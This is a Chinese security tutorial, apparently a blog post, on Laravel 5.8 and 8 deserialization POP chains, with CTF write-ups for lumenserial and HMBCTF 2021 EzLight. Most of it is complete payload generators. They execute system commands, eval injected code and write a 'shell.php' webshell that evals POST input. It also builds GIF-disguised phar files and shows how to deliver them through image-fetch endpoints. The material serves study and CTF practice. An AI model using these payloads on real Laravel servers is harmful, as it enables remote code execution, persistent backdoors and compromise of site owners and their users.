## Laravel5.8.x反序列化POP链

安装：其中`--prefer-dist`表示优先下载`zip`压缩包方式

    
    
    composer create-project --prefer-dist laravel/laravel=5.8.* laravel5.8

  

在路由文件`routes/web.php`中添加

    
    
    Route::get('/foo', function () {  
    if(isset($_GET['c'])){  
    $code = $_GET['c'];  
    unserialize($code);  
    }  
    else{  
    highlight_file(__FILE__);  
    }  
    return "Test laravel5.8 pop";  
    });

然后在`public`目录起一个`php`服务就可以进行测试了

    
    
    cd /public  
    php -S 0.0.0.0:port  
    /foo?c=

### 链一

链的入口是在`laravel5.8\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php`

    
    
    public function __destruct()  
    {  
    $this->events->dispatch($this->event);  
    }

这里的`$this->events`和`$this->event`可控，这里把`$this->events`设为含有`dispatch`方法的`Dispatcher`类，我们看到`laravel5.8\vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php`来

    
    
    public function dispatch($command)  
    {  
    if ($this->queueResolver && $this->commandShouldBeQueued($command)) {  
    return $this->dispatchToQueue($command);  
    }  
    return $this->dispatchNow($command);  
    }

跟踪进`commandShouldBeQueued`

    
    
    protected function commandShouldBeQueued($command)  
    {  
    return $command instanceof ShouldQueue;  
    }

这里要求`$command`（即传进来的`$this->event`）要实现`ShouldQueue`该接口

![headImg.action?news=158986a8-af00-4918-a559-fc3a3b4ae11a.png](https://image.3001.net/images/20210616/1623835158_60c9c21678800b881a292.png!small)

满足`ShouldQueue`接口的实现类即可，再跟踪进`dispatchToQueue`看一下

    
    
    public function dispatchToQueue($command)  
    {  
    $connection = $command->connection ?? null;  
    ​  
    $queue = call_user_func($this->queueResolver, $connection);

这里的`$this->queueResolver`和`$connection`都是可控的，到这里就可以直接构造`payload`

#### rce

    
    
    <?php  
    namespace Illuminate\Broadcasting {  
    class PendingBroadcast {  
    protected $events;  
    protected $event;  
    public function __construct($events, $event) {  
    $this->events = $events;  
    $this->event = $event;  
    }  
    }  
    class BroadcastEvent {  
    public $connection;  
    public function __construct($connection) {  
    $this->connection = $connection;  
    }  
    }  
    }  
    namespace Illuminate\Bus {  
    class Dispatcher {  
    protected $queueResolver;  
    public function __construct($queueResolver){  
    $this->queueResolver = $queueResolver;  
    }  
    }  
    }  
    namespace {  
    $c = new Illuminate\Broadcasting\BroadcastEvent('whoami');  
    $b = new Illuminate\Bus\Dispatcher('system');  
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);  
    print(urlencode(serialize($a)));  
    }

#### eval执行

到这里已经可以调用任意类的任意方法了，但是`call_user_func`无法执行`eval`函数，如果我们的`system`被`ban`了的话，就需要继续寻找执行任意命令的函数，我们找到`laravel5.8\vendor\mockery\mockery\library\Mockery\Loader\EvalLoader.php`

    
    
    class EvalLoader implements Loader  
    {  
    public function load(MockDefinition $definition)  
    {  
    if (class_exists($definition->getClassName(), false)) {  
    return;  
    }  
    ​  
    eval("?>" . $definition->getCode());  
    }  
    }

这里有一个`eval`函数，这里需要绕过`eval`上面的`if`语句，否则直接就`return`了

`$definition`变量是`MockDefinition`类，跟进一下

    
    
    class MockDefinition  
    {  
    protected $config;  
    protected $code;  
    ...  
    public function getClassName()  
    {  
    return $this->config->getName();  
    }  
    public function getCode()  
    {  
    return $this->code;  
    }  
    }

这里`$code`，`$config`可控，但是呢`$definition->getClassName()`需要一个不存在的类，我们找一个类其`getName`是可控的，然后构造一个不存在的类即可，如下

`laravel5.8\vendor\mockery\mockery\library\Mockery\Generator\MockConfiguration.php`

    
    
    class MockConfiguration  
    {  
    ...  
    public function getName()  
    {  
    return $this->name;  
    }  
    ...  
    }

`payload`如下

    
    
    <?php  
    namespace Illuminate\Broadcasting{  
    class PendingBroadcast{  
    protected $events;  
    protected $event;  
    public function __construct($events, $event)  
    {  
    $this->event = $event;  
    $this->events = $events;  
    }  
    }  
    }  
    namespace Illuminate\Broadcasting{  
    class BroadcastEvent  
    {  
    public $connection;  
    ​  
    public function __construct($connection)  
    {  
    $this->connection = $connection;  
    }  
    }  
    }  
    namespace Illuminate\Bus{  
    class Dispatcher  
    {  
    protected $queueResolver;  
    ​  
    public function __construct($queueResolver)  
    {  
    $this->queueResolver = $queueResolver;  
    }  
    }  
    }  
    namespace Mockery\Generator{  
    class MockDefinition  
    {  
    protected $config;  
    protected $code;  
    ​  
    public function __construct(MockConfiguration $config)  
    {  
    $this->config = $config;  
    $this->code = '<?php phpinfo();?>';  
    }  
    }  
    }  
    ​  
    namespace Mockery\Generator{  
    class MockConfiguration  
    {  
    protected $name = "none class";  
    }  
    }  
    ​  
    namespace Mockery\Loader{  
    class EvalLoader  
    {  
    public function load(MockDefinition $definition)  
    {  
    ​  
    }  
    }  
    }  
    namespace {  
    $config = new \Mockery\Generator\MockConfiguration();  
    $connection = new \Mockery\Generator\MockDefinition($config);  
    $event = new \Illuminate\Broadcasting\BroadcastEvent($connection);  
    $queueResolver = array(new \Mockery\Loader\EvalLoader(),"load");  
    $events = new \Illuminate\Bus\Dispatcher($queueResolver);  
    $pendingBroadcast = new \Illuminate\Broadcasting\PendingBroadcast($events, $event);  
    echo urlencode(serialize($pendingBroadcast));  
    }

#### 利用跳板

如果说靶机禁用了`system`等函数，我们希望用`file_put_contents`写`shell`等双参数的函数呢，这里有一个好的跳板`laravel5.8\vendor\phpoption\phpoption\src\PhpOption\LazyOption.php`

    
    
    final class LazyOption extends Option  
    {  
    ...  
    public function filter($callable)  
    {  
    return $this->option()->filter($callable);  
    }  
    ...  
    private function option()  
    {  
    if (null === $this->option) {  
    /** @var mixed */  
    $option = call_user_func_array($this->callback, $this->arguments);

这里的`$this->callback`，`$this->arguments`是可控的，但是注意到`option`的属性是`private`，无法直接从我们刚刚的`call_user_func`直接去调用它，但是有许多类似`filter`的函数里面有调用`option`的

这里可以直接构造`payload`

    
    
    <?php  
    namespace Illuminate\Broadcasting {  
    class PendingBroadcast {  
    protected $events;  
    protected $event;  
    public function __construct($events, $event) {  
    $this->events = $events;  
    $this->event = $event;  
    }  
    }  
    class BroadcastEvent {  
    public $connection;  
    public function __construct($connection) {  
    $this->connection = $connection;  
    }  
    }  
    }  
    namespace Illuminate\Bus {  
    class Dispatcher {  
    protected $queueResolver;  
    public function __construct($queueResolver){  
    $this->queueResolver = $queueResolver;  
    }  
    }  
    }  
    namespace PhpOption{  
    final class LazyOption{  
    private $callback;  
    private $arguments;  
    public function __construct($callback, $arguments)  
    {  
    $this->callback = $callback;  
    $this->arguments = $arguments;  
    }  
    }  
    }  
    namespace {  
    $d = new PhpOption\LazyOption("file_put_contents", ["shell.php", "<?php eval(\$_POST['cmd']) ?>"]);  
    $c = new Illuminate\Broadcasting\BroadcastEvent('whoami');  
    $b = new Illuminate\Bus\Dispatcher(array($d,"filter"));  
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);  
    print(urlencode(serialize($a)));  
    }

### 链二

入口同样是

    
    
    public function __destruct()  
    {  
    $this->events->dispatch($this->event);  
    }

这里转换思路，找某个类没有实现`dispatch`方法却有`__call`方法，这里就可以直接调用，找到`laravel5.8\vendor\laravel\framework\src\Illuminate\Validation\Validator.php`

    
    
    class Validator implements ValidatorContract  
    {  
    ...  
    public function __call($method, $parameters)  
    {  
    $rule = Str::snake(substr($method, 8));  
    ​  
    if (isset($this->extensions[$rule])) {  
    return $this->callExtension($rule, $parameters);  
    }

这里的`$method`是固定的字符串`dispatch`，传到`$rule`的时候为空，然后`$this->extensions`可控

跟踪进`callExtension`方法

    
    
    protected function callExtension($rule, $parameters)  
    {  
    $callback = $this->extensions[$rule];  
    ​  
    if (is_callable($callback)) {  
    return call_user_func_array($callback, $parameters);

`$callback`和`$parameters`可控，于是就可以构造`payload`了

    
    
    <?php  
    namespace Illuminate\Broadcasting{  
    class PendingBroadcast{  
    protected $events;  
    protected $event;  
    ​  
    public function __construct($events, $event)  
    {  
    $this->events = $events;  
    $this->event = $event;  
    }  
    }  
    }  
    ​  
    namespace Illuminate\Validation{  
    class Validator{  
    protected $extensions;  
    public function __construct($extensions)  
    {  
    $this->extensions = $extensions;  
    }  
    }  
    }  
    ​  
    namespace{  
    $b = new Illuminate\Validation\Validator(array(''=>'system'));  
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 'id');  
    echo urlencode(serialize($a));  
    }

这条链在`Laravel8`里面也是可以用的

#### 利用跳板

和上面一样可以加`LazyOption`这个跳板

    
    
    <?php  
    namespace Illuminate\Broadcasting {  
    class PendingBroadcast {  
    protected $events;  
    protected $event;  
    public function __construct($events, $event) {  
    $this->events = $events;  
    $this->event = $event;  
    }  
    }  
    }  
    ​  
    namespace Illuminate\Validation {  
    class Validator {  
    public $extensions;  
    public function __construct($extensions){  
    $this->extensions = $extensions;  
    }  
    }  
    }  
    ​  
    namespace PhpOption {  
    class LazyOption {  
    private $callback;  
    private $arguments;  
    public function __construct($callback, $arguments) {  
    $this->callback = $callback;  
    $this->arguments = $arguments;  
    }  
    }  
    }  
    ​  
    namespace {  
    $c = new PhpOption\LazyOption("file_put_contents", ["shell.php", "<?php eval(\$_POST['cmd']) ?>"]);  
    $b = new Illuminate\Validation\Validator(array(''=>array($c, 'filter')));  
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 'whoami');  
    print(urlencode(serialize($a)));  
    }

## Laravel8反序列化POP链

在下面参考链接文章中`Laravel8`有介绍三条链都很详细，链和上面`Laravel5.8`也差不太多，就不赘述，然后有一条可以`phpnfo`的，同样是经典入口类

`laravel859\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php`

    
    
    public function __destruct()  
    {  
    $this->events->dispatch($this->event);  
    }

这里的`$this->events`和`$this->event`可控

同样这里有两种方法，要不使`$this->events`为某个拥有`dispatch`方法的类，我们可以调用这个类的`dispatch`方法

要不就使`$this->events`为某个类，并且该类没有实现`dispatch`方法却有`__call`方法，那么就可以调用这个`__call`方法了

看到`laravel859\vendor\laravel\framework\src\Illuminate\View\InvokableComponentVariable.php`

    
    
    public function __call($method, $parameters)  
    {  
    return $this->__invoke()->{$method}(...$parameters);  
    }  
    ​  
    /**  
    * Resolve the variable.  
    *  
    * @return mixed  
    */  
    public function __invoke()  
    {  
    return call_user_func($this->callable);  
    }

这里的`_call`会直接调用`__invoke`，`$this->callable`也是我们可控的，不过这里只能调用`phpinfo`，比较鸡肋，`payload`如下

    
    
    <?php  
    namespace Illuminate\Broadcasting {  
    class PendingBroadcast {  
    protected $events;  
    protected $event;  
    public function __construct($events, $event) {  
    $this->events = $events;  
    $this->event = $event;  
    }  
    }  
    }  
    namespace Illuminate\View {  
    class InvokableComponentVariable {  
    protected $callable;  
    public function __construct($callable)  
    {  
    $this->callable = $callable;  
    }  
    }  
    }  
    ​  
    namespace {  
    $b = new Illuminate\View\InvokableComponentVariable('phpinfo');  
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 1);  
    print(urlencode(serialize($a)));  
    }

因为这里我们只能控制`$this->callable`，想要`rce`的话，还可以去找无参的方法里面带有`call_user_func`或者`eval`然后参数可控之类的，但是这里我找了好像没找到，读者有兴趣可以去试试

## CTF题目

### lumenserial

`lumenserial\routes\web.php`先看到路由文件

    
    
    $router->get('/server/editor', 'EditorController@main');  
    $router->post('/server/editor', 'EditorController@main');

再看到

`lumenserial\app\Http\Controllers\EditorController.php`

    
    
    class EditorController extends Controller  
    {  
    private function download($url)  
    {  
    ...  
    $content = file_get_contents($url);

发现这里的`$url`传进`file_get_contents`可以`phar`反序列化，然后`$url`的值来源于`doCatchimage`方法中的`$sources`变量

    
    
    class EditorController extends Controller  
    {  
    ...  
    protected function doCatchimage(Request $request)  
    {  
    $sources = $request->input($this->config['catcherFieldName']);  
    $rets = [];  
    ​  
    if ($sources) {  
    foreach ($sources as $url) {  
    $rets[] = $this->download($url);  
    }

我们看到`main`发现他是通过`call_user_func`来调用带`do`开头的方法

    
    
    class EditorController extends Controller  
    {  
    ...  
    public function main(Request $request)  
    {  
    $action = $request->query('action');  
    ​  
    try {  
    if (is_string($action) && method_exists($this, "do{$action}")) {  
    return call_user_func([$this, "do{$action}"], $request);  
    } else {

可以通过如下控制变量

    
    
    http://ip/server/editor/?action=Catchimage&source[]=phar://xxx.gif

然后在上面的`5.8`链的基础加上如下

    
    
    @unlink("test.phar");  
    $phar = new \Phar("test.phar");//后缀名必须为phar  
    $phar->startBuffering();  
    $phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');//设置stub  
    $phar->setMetadata($pendingBroadcast);//将自定义的meta-data存入manifest  
    $phar->addFromString("test.txt", "test");//添加要压缩的文件  
    $phar->stopBuffering();

上传`phar`文件再用`phar`协议打即可

![headImg.action?news=968e882f-1398-4eac-ad72-9b18e8e37fe8.png](https://image.3001.net/images/20210616/1623835160_60c9c21885b39913f9e84.png!small)

### [HMBCTF 2021]EzLight

给了`source.zip`源码，是`laravel`框架开发的`lightcms`，先在本地把环境搭起来先，主要是修改`.env`文件改改数据库信息

先看到`source\source\app\Http\Controllers\Admin\NEditorController.php`

    
    
    public function catchImage(Request $request)  
    {  
    ...  
    $files = array_unique((array) $request->post('file'));  
    $urls = [];  
    foreach ($files as $v) {  
    $image = $this->fetchImageFile($v);

在`catchImage`函数里面以`post`传给`file`参数再给到`fetchImageFile`的`$url`

    
    
    protected function fetchImageFile($url)  
    {  
    if (isWebp($data)) {  
    $image = Image::make(imagecreatefromwebp($url));  
    $extension = 'webp';  
    } else {  
    $image = Image::make($data);  
    }

这里的`$url`可控，这里`imagecreatefromwebp`因为`isWebp`的限制无法进入，所以这里的分支是进入`Image::make($data);`来，我们在此处下一个断点，然后分析一下前面的代码，我们需要在`vps`上放一个图片的链接，然后在`http://127.0.0.1:9001/admin/neditor/serve/catchImage`传参数即可动态调试了

然后一直跟进就可以发现有个`file_get_contents`函数

![headImg.action?news=1d3849c2-8ec7-455b-9731-0e1da60e6324.png](https://image.3001.net/images/20210616/1623835161_60c9c2196e5b4e64d8920.png!small)

至此结束，这里可以`phar`反序列化了

用上面的链一即可

    
    
    <?php
    namespace Illuminate\Broadcasting {
        class PendingBroadcast {
            protected $events;
            protected $event;
            public function __construct($events, $event) {
                $this->events = $events;
                $this->event = $event;
            }
        }
        class BroadcastEvent {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver){
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            public function __construct($callback, $arguments)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
            }
        }
    }
    namespace {
        $d = new PhpOption\LazyOption("file_put_contents", ["shell.php", "<?php phpinfo();eval(\$_POST['cmd']);?>"]);
        $c = new Illuminate\Broadcasting\BroadcastEvent('whoami');
        $b = new Illuminate\Bus\Dispatcher(array($d,"filter"));
        $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
        print(urlencode(serialize($a)));
    
        @unlink("test.phar");
        $phar = new \Phar("test.phar");//后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');//设置stub
        $phar->setMetadata($a);//将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test");//添加要压缩的文件
        $phar->stopBuffering();
        rename('test.phar','test.jpg');
    }
    

上传之后，在`vps`上放

    
    
    phar://./upload/image/202105/uwQGQ5sBTWRppO3lfHzOpxLkKODMS9NkrYHdobkz.gif
    

再到`/admin/neditor/serve/catchImage`用`file`传参打就可以了

本文涉及相关实验：[PHP反序列化漏洞实验](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182016010714511600001&pk_campaign=freebuf-wemedia)（通过本次实验，大家将会明白什么是反序列化漏洞，反序列化漏洞的成因以及如何挖掘和预防此类漏洞。）

